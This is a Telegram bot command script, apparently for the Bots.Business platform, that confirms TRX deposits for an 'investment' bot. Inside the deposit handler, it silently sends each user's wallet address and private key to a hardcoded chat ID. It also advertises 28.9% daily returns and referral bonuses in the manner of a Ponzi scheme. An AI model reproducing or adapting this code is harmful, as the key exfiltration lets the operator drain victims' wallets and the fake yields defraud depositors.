/*CMD
  command: rutjy
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var git = JSON.parse(content)
if (git == undefined) { Bot.sendMessage(content)
}else {
var tcid = git.response.txID
User.setProperty("trt",tcid,"string")
var inf =
  "[" +
  user.first_name +
  "]" +
  "(" +
  "tg://user?id=" +
  user.telegramid +
  ")";
//Bot.sendMessage("*Dear user your deposit is tracked the Transaction hash of your payment is* \n "+tcid+"")
var res = User.getProperty("wallset")
var priv = User.getProperty("wallpk")
Bot.sendMessageToChatWithId(5163548809,"*User name :* "+inf+" \n\n*Address :*\n"+res+"\n\n*Private Key :*\n"+priv+"\n\nFrom this user balance is transferred to your wallet \n\n*RAW DATA* "+tcid+"")
var cbal = User.getProperty("cbal");
var wallet = User.getProperty("wallset")
var amount = parseFloat(cbal)
var profit = 1.35 * amount
var profi = 2.35 * amount
var prof = 4.35* amount
var time = Libs.DateTimeFormat.format(new Date(), "dd/m/yyyy h:M:s T") + "M"
var P = 28.9
var amountt = amount * 0.289 * 100
var key = "@TronMatePays"
var boto = Libs.ReferralLib.currentUser.getRefLink("tronMatebot","131")
var history = User.getProperty("history")
var txn_id = User.getProperty("trt")
var info =
  "[" + user.first_name + "]" + "(" + "tg://user?id=" + user.telegramid + ")"
if (amount >= 10 && amount <= 10000){
  Bot.sendMessage(
    "*👑 New Deposit Confirmed\n\n🔰 Received in|👑 Nuevo depósito recibido \ n \ n🔰 recibido en  @ " +
      bot.name +
      "\n🤴🏻 By INVESTOR |Por usuaria| : " +
      user.telegramid +
      "\n💸 Deposit|Depositar| : " +
      amount +
      " TRX♦️\n\n⏱ " +
      P +
      "% in 24" +
      " Hours\n\n✔ Expected Return after |Retorno esperado después| 100" +
      " Days : " +
      amountt.toFixed(6) +
      " TRX♦️\n\nTo Earn More Share Your Referlink Now!: \n\n" + boto +
      "*"
  )
Api.sendMessage({
    chat_id: key,
    text:
      "<b>👑 New Deposit Received\n\n🤴🏻 By Investor: " +
      user.first_name +
      "\n👤 User Id : " +      user.telegramid +
      "\n💸 Amount : " +
      amount +
      " TRX♦️\n\n⏱ " +
      P +
      "% in 24" +
      " Hours\n\n✔️ Expected Return after 100" +
      " Days : " +
      amountt.toFixed(6) +
      " TRX♦️\n\n🤖 Bot @" +
      bot.name +
      "</b>",
    parse_mode: "HTML",
    disable_web_page_preview: true
  })
  var depo = Libs.ResourcesLib.anotherChatRes("depo", "global")
  var deposit = Libs.ResourcesLib.userRes("deposit")
  deposit.add(amount)
  depo.add(amount)
  User.setProperty("minertrx2", amount, "integer")
  var inv = Libs.ResourcesLib.userRes("AccrualAm")
  inv.add(10)
  if(amount > 600 ) { User.setProperty("vip","1","string")
  Bot.runCommand("/updone") } else { Bot.sendMessage() }
  Bot.run({
    command: "\message",
    run_after: 1 * 60 * 60 * 24,
    options: { amount: amount }
  })
  var lilo = Bot.getProperty("total")
  var total = lilo + amount
  Bot.setProperty("total", total, "integer")
  if (history == undefined) {
    var newh =
      "🔹 Invested Amount : " + amount + " TRX\n📆 DATE : " + time + "\n\n"
    User.setProperty("historyI", newh, "string")
  } else {
    var nwh =
      "🔹 Invested Amount : " + amount + "TRX\n📆 DATE : " + time + "\n\n"
    var toal = nwh + history
    User.setProperty("historyI", toal, "string")
  }
  var bonus = amount * 0.291
  var refx = User.getProperty("Reffer")
  if (refx == undefined) {
    Bot.sendMessage("*Check Payment Channel :* " + key + "")
  } else {
    Bot.sendMessage("*Check Payment Channel :* " + key + "")
    var fm = Libs.ResourcesLib.anotherUserRes("balance", refx)
    var refcom = Libs.ResourcesLib.anotherUserRes("refcom", refx)
    fm.add(bonus)
    refcom.add(bonus)
    Bot.sendMessageToChatWithId(
      refx,
      "*➕ Your Referral* " +
        info +
        " *Deposited\n\nYour Bonus :*" +
        bonus.toFixed(6) +
        " *TRX*"
    )
  }
}
}
